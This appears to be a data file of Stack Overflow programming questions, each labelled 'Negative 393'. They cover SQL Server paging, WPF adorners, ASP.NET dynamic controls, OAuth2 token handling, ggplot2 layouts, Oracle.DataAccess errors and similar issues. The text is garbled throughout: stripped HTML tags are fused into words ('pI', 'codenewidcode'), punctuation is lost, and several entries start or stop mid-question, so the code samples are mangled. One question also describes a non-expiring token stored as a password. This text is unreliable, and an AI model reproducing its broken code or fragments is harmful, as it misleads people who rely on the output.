Negative 393 pI am trying to figure out a way to randomly pull out X records from a table that currently has 129,503 records with more being added fairly regularly, with the caveat being that I need to paginate them, preferably at the database level. Utilizing codenewidcode wont work because paging that result set wouldnt be possible as it changes every time, nor is utilizing codeTABLESAMPLEcode since it doesnt return a guaranteed set of records every time. One thought I had was to possibly generate a random value i.e. codenewidcode that is stored on every record in here so I could do initial ordering by that vs. generating it on the fly, but then paging through those results in a consistent manner was a little out of my realm.p  pThink of this as I need to show every user who visits our site a set of records from this table, but want each user to have a different view making it look as if its random, but then would need reliable paging to work with those records peruser so they dont end up with results that have already been seen on a previous page. p  pThis is with SQL Server 2012 so any ideasp

Basically this is how its done a hrefhttpwww.nbdtech.comBlogarchive20100628wpfadornerspart2ndashplacinganycontrolonthe.aspx relnofollowClickap  pBut there is one problem. The overlay should fill the available space. So I set the codeVerticalcodecodeHorizontalAlignmentcode property of the Forms Panel which is the Child of the codeControlAdornercode to codeStretchcode. However it only takes as much space as needed to show the Panel instead of using the whole available space.p  pI think this is whybr The codeControlAdornercodes method codeMeasureOverridecode is called with the correct size the available space. But then the Childs codeMeasurecodemethod is used to calculate the desired size. And that call seems to ignore the codeStretchcode property. Probably because the Child has no codeParentcode set, because the Child is generated dynamically.p  pIs there a way to achieve this codeStretchcodething for the codeAdornercodes Child to work properlyp

So after entering the values and clicking on the Save Values button the code behind page logic is not able to retrieve the values entered into the dynamically created fields.p  pI came to understand by reading the topics in stackoverflow that again the controls have to created inside codepageintcode or codepageloadcode with same names.p  pMy questionsp  ol lipIm creating controls dynamically inside a button click event. The step can be repeated any number of times and the user will generate as many controls as he wants. Should I have to actually save the number of times user generated the dynamic controls and names of each dynamic control generated in any session or static array kind of thing to preserve the data for regenerating the code again in post back.pli lipNow during the post back event of Save Values button where exactly should I recreate the controls, I mean is it in codepageinitcode or codepageloadcodepli lipBy recreating the controls again with same names from session saved names  if that is how it has to be done, if not please suggest, what happens to the controls that were created by Add More button click event and what happens to the values that are entered in those dynamically created controlspli lipHow can I read the values back in C Any sample code would be highly appreciated.pli lipAre there any ready made extensions on internet like any third party paidfree controls which can give this functionality If yes any referencepli lipAny alternate way to achieve this entire functionalitypli ol

Negative 393 pI have a large database that I want to set up a generalized query method for subtables or a join between subtables. However, the tables Im interested in are subtables of a parent table that is an unknown number of tables deep of relationships from that parent table, depending on the table Im querying. p  pIs there a means by which your can get SQL to automatically join all of the interim tables between the two tables of interest Or narrow a query to only a subset of parent tablep  pFor example this set of relationships FolderTableSystemTableItemsTableItemsClassItemsattributesItemsMethodsMethodDataMethodHistoryp  pI want to be able to generically do searches or joins of any of the subtables, where the results are for only a single folder of Foldertable, without having to do a series of explicit joins to X table levels deep... which would significantly increase the complexity of building generic queries interfaces at runtime.p

Negative 393 pI have a codeUsercode model that has name, email, and password.p  pIf a user signs up normally through a form the password stored in my db is hashed using codepasslibcode. Then, a token is generated and returned to the users client. The token is a serialization of the players id. To verify a player, he simply logs in with the token in the password field of a basic auth, and I simply deserialize the token and look up the player via the deserialized id. Also, a player may verify himself with his password.p  pThe problem with using Googles OAuth2 is that a player does NOT set his password he only sends the server a Google verified token, which the server sends to Google and obtains the users email, name, etc.p  pHow do I generate a password for the user What am I supposed to do herep  pMy hackish workaround right now for Google OAuth2 user registration is simply get the users info from Google, generate a bogus password which is hashed, and then generate the auth token for the user. Then, replace the bogus password with the auth token which is hashed and insert that as the users password. The auth token is then returned to the users client.p  pIn other words, the auth token becomes the password. Right now my auth tokens dont expire either.p  pObviously this is a huge hack. Whats the correct way to do this Should I just ping Google every time a user needs to verify himselfp

Negative 393 pI am trying to create an arrangement of three scatterplots with shared axes and marginal histograms. This seems like it should be simple, but its giving me fits. I have tried approaches with gridExtra and gtable, both of which have gotten the general arrangement like I want but with alignments and plot sizes that were off.p  pThere are many other posts related to this question and I have experimented with the answers given to many of them, especially answers from baptiste a hrefhttpstackoverflow.comquestions18427455multipleggplotsofdifferentsizesherea and a hrefhttpstackoverflow.comquestions13294952leftaligntwographedgesggplotherea. The latters approach to controlling width might be the key to the alignments, but I havent understood it well enough to adapt it to my problem.p  pA minimal working example follows, preceded by its result. The result has quite a few problemsp  ul liThe bottom right plot is bigger than the other two. This has been an issue with all approaches, including grid.arrange, with which I placed a blank rectangle grob to balance the scatter plots.li liThe sizes of the maringal histograms are way off and not what I would expect from the code, which is that their narrow dimension would be about 14 the size of the scatter plots width.li liThe spacing of the plots is too wide. li liNone of the marginal histograms align correctly with the scatter plots.li liThe marginal histogram on the right c is so narrow that it doesnt show up at all in the png, yet it does show up though still too narrow in the RStudio plot viewer, though only when zoomed.li ul  pBonus points for an answer that will align the plots axes correctly even if the width of the axes labels varies between plots as such would be much more adaptable for future problems.p  pimg srchttpi.stack.imgur.comJDVuz.png altmultiplotp  precodelibraryggplot2 librarygrid librarygtable data lt data.framea  rnorm100, 30, 3, b  rnorm100, 40, 5, crnorm100, 50, 3 ba.scatter lt ggplotdata, aesxa, yb  geompoint  coordequalratio1, xlimc0,100, ylimc0,100    theme     axis.text.x   elementblank,     axis.title.x  elementblank,     axis.ticks.x  elementblank,     plot.margin   unitc1,0,0.5,1, cm     ca.scatter lt ggplotdata, aesxa, yc  geompoint  coordequalratio1, xlimc0,100, ylimc0,100    themeplot.margin  unitc0.5,0,0.5,1, cm  cb.scatter lt ggplotdata, aesxb, yc  geompoint  coordequalratio1, xlimc0,100, ylimc0,100    theme     axis.text.y   elementblank,     axis.title.y  elementblank,     axis.ticks.y  elementblank,     plot.margin   unitc0.5,0,0.5,0, cm     a.hist lt ggplotdata, aesxa  geomhistogram  coordequalxlimc0,100, ratio14    theme     axis.text.x   elementblank,     axis.title.x  elementblank,     axis.ticks.x  elementblank,     axis.text.y   elementblank,     axis.title.y  elementblank,     axis.ticks.y  elementblank,     plot.margin  unitc0,0,1,1, cm     b.hist lt ggplotdata, aesxb  geomhistogram  coordequalxlimc0,100, ratio14    theme     axis.text.x   elementblank,     axis.title.x  elementblank,     axis.ticks.x  elementblank,     axis.text.y   elementblank,     axis.title.y  elementblank,     axis.ticks.y  elementblank,     plot.margin  unitc0,0,1,0, cm     c.hist lt ggplotdata, aesxc  geomhistogram  coordflipxlimc0,100    theme     axis.text.x   elementblank,     axis.title.x  elementblank,     axis.ticks.x  elementblank,     plot.margin  unitc0,1,0,0, cm     blankPanel lt grid.rectgpgparcolwhite  gt lt gtablewidths   unitrep1,9, null,              heights  unitrep1,9, null,              respectT gl lt listggplotGrobba.scatter,              ggplotGrobca.scatter, ggplotGrobcb.scatter, ggplotGrobc.hist,              ggplotGroba.hist, ggplotGrobb.hist  gt lt gtableaddgrobgt, gl,                 lc1,1,5,9,1,5,                 rc4,4,8,9,4,8,                 tc1,5,5,5,9,9,                 bc4,8,8,8,9,9  grid.newpage pngmultiplot.png grid.drawgt dev.off codepre

Lets assume we have a simple codestructcode like sop  precodestruct    int     iMyInt   char    cMyChar   double  dCoordinates[128]  st codepre  pMy approach would be to do thisp  precodest myStruct   0  codepre  pMy colleague advised this approach insteadp  precodest myStruct    codepre  pHe noted that my approach initializes a single element, and then the rest of the elements, in a twopart operation, while his approach initializes the entire codestructcode in a onepart operation that is faster and more efficient. p  pIs this true, and if so, is it always the case across all compiler optimization levels ie does the compiler figure this out and optimize it for me anywaysp  pThank you.p
Negative 393 pI created a array bubble sort function for integers that works perfectly with positive integers but it crashes when negative integers are used. The initial display function works but then it just freezes.

Negative 393 pI built a site where nearly every element got its size in vwunits. So text, padding, margin, height and width of every element is set in vw. This works great.p  pMy problem is that there should be a change and now the site should not scale over 1200pxwidth any more. That means if the screen is wider than 1200px the site should not fill 100 of the width and every element should be as big as it would be on 1200px screen width.p  pFor sure I have a div with a maxwidth of 1200px but everything inside is still growing with the screen.p  pI know that I can use 1200px as a breakpoint and that I can define every element again beyond that. But that is what I want to avoid.p  pMy question means Is there any way to modify the cssunit vw in the way that it uses 1200px as basewidth for every wider screen than thatp

This isnt a religious war on which is best, its more important that we have something to migrate into. The most important requirement being its fluently configured to avoid config hell.p  pOther concerns we have are in StructureMap terms, is how we declare the registries. Do we declare the registries per assembly Any recommended naming standard around folders, class names in a large application My rough guess is will have around 1000 registries.

So basically, T3  P2.p  pWhen CPU is scheduling, will it pick up P1, and then within P1 it will pick up T1, and when the timeslice expires, it schedules P2, and when time slice expires again, it picsk P1 but somehow knows that it should schedule T2 this timep  pCan anyone help me understand this. Just curious.p  pThanksp

Negative 393 pMy todays question is about strange behaviour of codefann2code package for Python 2, while using codematplotlibcode or codepyqtgraphcode simultanously.p  pLets say that I need to plot my FANN network MSE in a real time. I will then use codematplotlibcode with interactivity and some codewhile Truecode loop or codeThreadcode to update my plot. But for simplicity lets have a following example.p  pFollowing script will create a new neural network and store it into a filep  precodeusrbinpython2  from fann2 import libfann import matplotlib.pyplot as plt  PLOT  False  if PLOT     plt.show     axes  plt.subplot111  connectionrate  1 layers  10, 5 activationf  libfann.SIGMOIDSYMMETRICSTEPWISE ann  libfann.neuralnet ann.createsparsearrayconnectionrate, layers ann.randomizeweights0.1, 0.1 ann.savemynetwork.ann codepre  pNote the codePLOTcode flag that currently disables the plot.p  pLets now take a look at the output file. Lets see f.e. the last linep  precodeconnections connectedtoneuron, weight0, 9.04591381549835205078e02 ... codepre  pcode...code means more ommited charactersp  pEverything is fine until we change codePLOTcode value to codeTruecode... After that the corresponding line will look something like thisp  precodeconnections connectedtoneuron, weight0, 7,55163878202438354492e02 ... codepre  pThis leads to errors in loading a saved network. Examplep  precodefrom fann2 import libfann ann  libfann.neuralnet ann.createfromfilemynetwork.ann codepre  pGives following error codeFANN Error 4 Error reading connectionrate from configuration file mynetwork.ann.codep  pDoes anybody have any idea how to fix this strange issue Maybe should I simply change a floating point number format somewhere in matplotlib Ive searched theirs documentation but havent found how to do that.p  pI suppose that cause is somewhere else. This is quite funny, but PyQtGraph gives the same results.

Negative 393 pSince yesterday, Ive been trying to port an ActionScript Mobile project from Flash Builder 4.6 to Flash Builder 4.7, and Ive run into a little bit of a problem thats probably a compiler bug.

The error I get back is thisp  precodeReferenceError Error 1069 Property useSmallPortraitLayout not found on StartMenu and there is no default value. codepre  pNow that being said, this can be fixed in one of at least two waysp  ol liUse Flash Builder 4.6li liComment out codeonScreenSizeDeterminedreturncode, thereby using a member function to call codeuseSmallPortraitLayoutcode, instead of a static function.  This doesnt require using the constructor it works just fine, as long as codeScreen1code is calling codeuseSmallPortraitLayoutcode from pretty much any nonstatic method.li ol  pUnfortunately the static method will fail, even when its called from outside the constructor andor from a timed delay.  One thing I dont emspecifically rememberem in 4.6, but I am seeing it in at least 4.7, is that using an unrelated class to call a static method directly through an instance wont compile  it has to be done in a staticky way in unrelated classes.  Not that I do things like that in real code, but it does make me wonder if the relationship between static and nonstatic has intentionally changed.p  pThis is probably just some trivial compiler bug specific to FB 4.7, and I would just go right back to 4.6, but pure ActionScript library projects are directly supported only in 4.7.  This is a mobile project, but I was going to add a library project to the solution.p  pOne thing to note is the code will not compile in FB 4.7 if the static function calls codeuseSmallPortraitLayoutcode this wayp  precodescreen.useSmallPortraitLayout codepre  pIt has to call it dynamically for it to even compile.p  pIs there an easyenough fix for this  Has there been a little bit of syntactical weirdness that 4.6 has simply been overlooking this whole time  Whats wrong, and whats a good solutionworkaroundp  pstrongUPDATEstrongp  pIf worst comes to worst, it does seem to work to partially replace the codeVector.ltScreen1gtcode with a codeVector.ltFunctiongtcode, and then just make calls to the members of the function vector, instead of to functions of the members of the codeScreen1code vector.  This is simplified from production code.  But thats just a fallback.p  pAlso, something I wasnt paying a lot of attention to previously specifically as far as this one problem goes, but BotMaster kind of brought it to my attention, is that in the process of going from FB 4.6 to FB 4.7, I also went from AIR 3.1 to AIR 3.4.p

Once initialized, the size never changes.  pli lipA codestdvectorcode which I know the initial size of, but whose size could change throughout the program.  pli lipA user defined object containing codestdvectorcode objects, whose sizes all dont change. Other fields also dont change in size, but the sizes are not known at compiletime.  pli lipA user defined object whose fields could all change in sizepli ol  pIt seems to me that I should use codenewcode in case 1 and 2, but not 3 and 4. Although, in 3 and 4, I should use codenewcode to allocate memory for the fields inside the user defined object. Is this correct  p  pDoes the usage of codenewcode depend on emhow muchem the size of an object changes  p  pIf I dont use codenewcode, what risks am I taking such as stackoverflowp  pIn examples 3 and 4, If I dont use codenewcode, and I pass this object around, will I be making copies of the object each time I pass it   p  pIf so, and the size of the object is too big for instance, it has many, very large fields, could passing the object possibly cause a stackoverflow, corrupting the data of other objects on the stack  p  pFinally, when using codenewcode, I understand I also have to use codedeletecode. However, if a lot of different objects lets call them A, B, and C have access to the same pointer P, how does calling codedeletecode in A affect P in B and C I assume it frees up the memory for all of them, such that if I now call Pgetsomething in B or C, I would receive a segfault. Then, to prevent a memory leak, as long as emsomethingem still has access to P, I should not call codedeletecode, but as soon as Im sure emnothingem has access to P, I need to delete it, rightp

I fix the code, run the test again, but the test fails again, like if the file wasnt changed.p  pIf I go to KarmaServer tab, shutdown the server, close the Run session see the screen snap and run everything again, the changes are being applied and test succeeds.p  pHow could I avoid this restartingp  pimg srchttpi.stack.imgur.comBCvi8.png altenter image description herep  hr  pUPDATEp  pWell, Ive just figuredout, that it is not update only proxied code.p  pIt is a large app. We have got 300 files 1 file1 moduleservicedirective declaration with 301200 loc in each. And... Well.. mm... Yep We just started to write unit tests p  pSo the most simple is to just load everything like the browser does. No manual serving. There is a file, generated by the codegruntangularbuildercode. It requires a number of files from the server and Karma proxies these requests to the real server, which is serving app locally. It has got some nginx directives and other stuff. Also the order matters, so it is not easy to manually write this all in the proper order for exact test suite in codeltblablagt.conf.jscode ..p
Negative 393 pI have a 24 bit register that comprises a number of fields.

However, that is fairly unreadable to anyone trying to maintain it. p  pThe question is, if I define each subfield separately whats the best way of coding it all togetherp

Negative 393 pI have created an ASP.NET MVC5 application that allows users to access their financial data including invoices, services and products that they have acquired from our company. p  pThe application gets all data from a set of WCF services including a list of all registered users that have access to the system. Im using ASP.NET Identity object and claims to authorize users into the application, everything works fine I only have to use the credentials email and password to invoke the WCF service which returns an object containing the details about the User or a NULL value if theres no match. p  pHowever, theres a new requirement to implement an account lockout after 5 failed login attempts the account will be locked for 20 minutes before allowing users to try again which is a feature already included in ASP.NET identity 2.0.

Negative 393 pI am trying to access the content inside a strongtdstrong element through the JavaScript stronginnerTextstrong property inside an excel VBA macro. It works perfectly for all cases except for this one case where the text inside the strongtdstrong element is very long greater than 85982 characters.p  pUpon inspection of the text extracted by innerText, I found that innerText seems to be truncating the text after a certain length. Note that this doesnt happen for other cases where the text size is small.p  pAlso, it seems that Mozillas strongtextContentstrong property has a similar problem as well. I tried accessing the truncated part of the text using the developer console in Firefox for the aforementioned DOM element, but it seems that text isnt there in the extracted content but the not truncated text is there  just like with innerText.p  pDoes anyone know how to bypass this restriction Is there some internal limit on these functionsp  pHeres my VBA code that has this problemp  precodeMyInnerText  objElement.ChildNodes3.innerText codepre  pHeres an equivalent code run in the Firefox console which has the same problemp  precodevar t  document.getElementsByNamechapter11[0].parentNode.children[3].textContent t.matchsome text that is in the part being truncated. codepre  pFor Firefox, this problem seems to go away if I inspect the element, and click Show all 3396 nodes.

Negative 393 pI have added a codeUIScrollViewcode to a custom codeUITableViewCellcode.  p  pI designed the cell and added the codescrollviewcode in my storyboard and set the constraints there.

Negative 393 pIm making what amounts to a level editor for a game, and Im not sure the best way to store the game content as a file. To be clear, this is a design question, not a technical one.p  pThe game content can be broken down hierarchically into multiple levels, each with multiple scenes, that have multiple events, etc., each of which are relatively independent. However there are also data, such as items and characters, that will be referenced globally across the game.p  pIdeally this editor would support multiple users, who could each edit nonconflicting parts of the game content, and then merge the changes together without issue think source code in a version control system. Ideally, the game content should also be easy to load into the game once finished i.e. I should be able to load a level and have all necessary pieces load together without navigating a filesystem.p  pIve come up with a few ideas for how I could do this, none of which are wholly satisfactoryp  ul lipSplit the game content across many files, so that parallel edits are easy to make and merge. Use folder structure and a project file to keep track of files, something like how Visual Studio handles code projects. The cons are that this is harder to manage in the game, and its harder for content to reference other content in another file e.g. a character who has an item.pli lipUse a single binary file, but create merge functionality, similar to what MS Word does or how git merges text files. The cons are that this means you have to manually resolve all merge conflicts and the merge functionality will likely be nontrivial to implement.pli lipUse just a few files to represent large pieces of the game, and hope people using the editor are smart enough not edit the same one at the same time. The cons are selfevident, but this would be a good deal easier to implement.pli ul  pObviously I have underspecified the problem, but hopefully Ive given enough information for people to know what Im talking about. Does anyone have any helpful insights or has anyone had a similar problemp  pIf it helps, these will likely be .json files, versioned using git.p

I want to do the same but instead of label I am using custom buttons with images. As you can see in the video, the author hardcoded the size of the label to 100wx100h. However regardless of the what iphone you have, the labels always be the same size. I want to accomplish the same thing, but instead I want the size of buttons or in his case labels be larger on iphone 5, and even larger in iphone 6 and so on. My question is how can I accomplish this Also is it possible design this with let say 100X100 in 3.5inch iphone then change the size dynamically change in the code depends what iphone is used if iphone4s then use 100X100 size buttons else if iphone 5 then use 110X110 size buttons and so onp

Negative 393 pIm writing a stylesheet for a web site where I need to support multiple skinsthemes.  For example, one theme might be blackonwhite with red as the primary color, and another theme might be whiteonblack with maroon as the primary color.p  pAlmost all of the CSS from one theme translates over to the other theme, except for things like foreground and background color.p  pAs an illustrative example, say we have a div.  The size and position of that div is fixed between themes, but the color might change.  We could separate this into three different CSS files like sop  precode main.css  box      position absolute     top 50px     left 50px     width 200px     height 200px    theme1.css  box      backroundcolor red    theme2.css  box      backgroundcolor maroon  codepre  pThen the end user would load emmain.cssem plus one of the theme stylesheets.  Another design would be to put a class on the body element, and use selectors to apply the right colors, all in one CSS file.  For example,p  precodebox      position absolute     top 50px     left 50px     width 200px     height 200px   body.theme1 box      backroundcolor red   body.theme2 box      backgroundcolor maroon  codepre  pThe advantage of the second option is that there are fewer HTTP requests.  The advantage of the first option is that the user needs to load less data from the server.  This is especially important when there are many different themes, and as in my use case when inlined background images significantly increase the weight of the CSS files.p  pSo my question is, stronghow can I leverage the power of CSS preprocessors like SASS or Stylus to create multiple CSS theme filesstrongp  pI envision something like this maybep  precodethemetheme1      primaryColor red  themetheme2      primaryColor maroon   box      position absolute     top 50px     left 50px     width 200px     height 200px      backgroundcolor primaryColor  codepre  pwhich would in turn generate the three CSS files listed above in the first example.p  pAny ideas  Does something like this already existp

Negative 393 pHere is the conundrum.  I have a specific set of state variables that are used in almost every supporting object I have, and I want those variables to be able to be read by any object that needs to read them, but I want to protect them so that only 1 object has the ability to set them.p  pFor example, lets say I am making a poker game.  Variables like  Minimum Ante  Maximum Bet  Maximum Number of Players  Current GameState Placing Bets, Shuffling, Dealing, Paying, etc.p  pPersonally, I prefer small compact component classes, so lets say I have the majority of the poker game logic in 1 controller class, but i have 50 supporting objects that handle everything that isnt the poker game logic itself, such as a PlayerInterface, a graphics controller, The Deck to handle shuffle and deal logic, etc.  Alot of my smaller support classes need to see what the minimum ante is, and the current method I am using is for the controller class to pass these variables into the supporting classes as parameters.p  pThe obvious downside to this is I have 50 supporting objects all holding on to their own local variables for minimum ante to hold the same information that I am passing to them from the controller.  Wasted parameters, memory, and opens a ton of risk if any of those variables ever get out of sync.p  pSo, how to I make these variables global so everyone can access and read them  The knee jerk reactionary answer is some public static variables, however this presents the problem that anyone could also write to them.  Not only do I not want my supporting objects having the power to change the minimum ante without the controllers knowledge, but I also dont want the client shell that holds the poker game to be able to change them without first going through the proper checks contained in the controller.p  pSo what do I do  Someone once mentioned to me the idea of a Singleton, but after plenty of research, most of it a few years old or more, I found about a 5050 split in the community who say Singletons are a good idea vs those who think they arent.p  pIf not singletons or statics, then what  I am open to any ideas to research and try out.p  pRemember, I want any object, anytime, anywhere to be able to GET the data it needs, but only a very specific object to have the ability to SET the data, should it need to change, so that it can filter through the proper checks.  By proper checks, I mean for example in the poker game, if a player has the ability to change the Minimum Bet on the table, he should only be able to do so between hands, or before a tournament begins.  I dont want him messing with these things during play.p  pThanks in advance for any input.p

Given a point strongp  strong,  the  normal direction strongnpstrong   is computed as follows i the positions of the   control points of strongstrong are filtered via a bidimensional Gaussian   kernel and, ii strongnpstrong is estimated as the unit vector orthogonal to   the line through the preceding and the successive points in the   list.  p blockquote  pSo it appears that I need to put all these points in a gaussian filter. How do I set up a bidimensional Gaussian filter when we have a single dimension or a list of points p  pLets say our contour is a box shape at points, then I create a 1 dimensional list of points [1,1],[1,2],[1,3],[2,1],[2,3],[3,1],[3,2],[3,3]. Do I need to simply make a new 2d matrix table and put the points in and leave the middle point at [2,2] empty, then run a Gaussian filter on it This doesnt seem very strongdensestrong though. p  pI am trying to run this through python libraries. p

Negative 393 pHey I have following situationp  pstrongClass Foostrong has a List of strongFoosstrong, br Every strongFoostrong contains one or more Objects of the Class strongBarstrong and has therefore a List strongBarsstrong. br Every strongBarstrong has one or more Objects of strongQuxstrong, which is another class and because of that is safed in a List named strongQuxsstrong.p  pIs it even possible to loop through these Lists  Sets with a Wicket emTableTreeem, emTreeTableem, emDefaultTreeTableem or whatever else.p  pRight now Im trying to solve this with 3 nested emListViewsem, which seems not to be the best solution. Because if you have to use a ListView, whitin a ListView of ListView, it is difficult to get the Object you are refering to.p
Negative 393 p.NET Framework makes it easy to do parallel aggregation, but according to a hrefhttpsmsdn.microsoft.comenuslibraryff963547.aspx relnofollowthe documentationa, it works for commutative operations only, that is an operation where emfememxem, emyem  emfememyem, emxemp  blockquote   pThe .NET implementation of the Parallel Aggregation pattern also expects the operations to be commutative.p blockquote  pI want to aggregate string values using a concatenation, that is a noncommutative operation. A sequential approach looks like thisp  precodevar result  string.Concatsequence.Selectthis.LongOperation codepre  pso if codethis.LongOperationcode returns successively codeHellocode, codeWorldcode and codecode, the final result is codeHelloWorldcode.p  pIf I use parallel aggregation, the result could be codeHelloWorldcode, but also codeWorldHellocode, codeHelloWorldcode, etc.p  pA workaround would be to do something similar top  precodevar result  sequence     .AsParallel     .Selectv, i gt new  Index  i, Value  v      .Selectc gt new  Index  c.Index, Value  this.LongOperationc.Value     .OrderByc gt c.Index     .Aggregateseed string.Empty, func prev, current gt prev  current codepre  pwith the unimportant, in my particular case drawback that the entire sequence will be evaluated at codeOrderBycode step anyway, without waiting until the aggregation.

Negative 393 pI created this topic as I could not find the answer even though there are many similar threads.p  pRecently many users reported that the tool created in Visual Studio stopped working. This is a WPF application written in C and its purpose is to pick up Excel spreadsheets and export them to Oracle database for further calculations. p  pThe application crashes when it attempts to create a class codeOracleBulkCopycode which is a member of codeOracle.DataAccesscode library it is added to the project as Reference. The project was distributed among users as installation package and the idea was that they do not need to install anything else. p  pCurrently I am investigating this issue on 3 machinesp  ul li1  my regular laptopli li2  virtual machine set up on my laptopli li3  old laptop delivered by my colleagueli ul  pIt works well only on machine no 3 which has reinstalled Windows 7 64bit and Oracle Client 11g Oracle.DataAccess version 2.112.2.0. The other two also run on Windows 7 64bit, we performed tests on various Oracle libraries. Machine number 1 is a bit messy as I removed or reinstalled many versions of DataAccess and in GAC they are all visible. I tried to setup machine no 2 virtual machine, also fresh Windows 7 the same way as machine no 3 but the application still crashes.p  pHere is the error message and my findings after browsing some forums and StackOverflow questions.p  pa hrefhttpi.stack.imgur.comUarxh.jpg relnofollowimg srchttpi.stack.imgur.comUarxh.jpg altltphoto1gtap  ol liI found some information about codeInnerExceptioncode which I caught with try...catch.

Laptop 1 shows total mess  as I mentioned earlier result of numerous reinstallations. Laptop 3 the old one which works fine shows just 1 entry for Oracle.DataAcces and 2 Policy records. Laptop no 2 also shows the same libraries as laptop 3 but it does not work. I wanted to edit GAC lists but unfortunately due to lack of admin rights I am not able to do that either manually or with codeGacutil.execode. If this may fix the problem the only option is to install the package with correct libraries.pli lipI also found a tutorial which suggests unloading the project and editing codecsprojcode. I corrected some values but this also did not bring the expected result.pli lipOne discussion mentioned that faulty class may have static constructors but codeOracleBulkCopycode does not have any static elements.pli ol  pa hrefhttpi.stack.imgur.comICUhF.jpg relnofollowimg srchttpi.stack.imgur.comICUhF.jpg altOracleBulkCopy classap  pI am running out of ideas how this can be fixed.

My problem is that the test involves popups on my screen in Chrome asking for confirmation, but if it were possible for me to disable javascript completely at will, then I can get past the constant trail of popups that come up on these test pages. Anyone know of a way Maybe at the system level even p
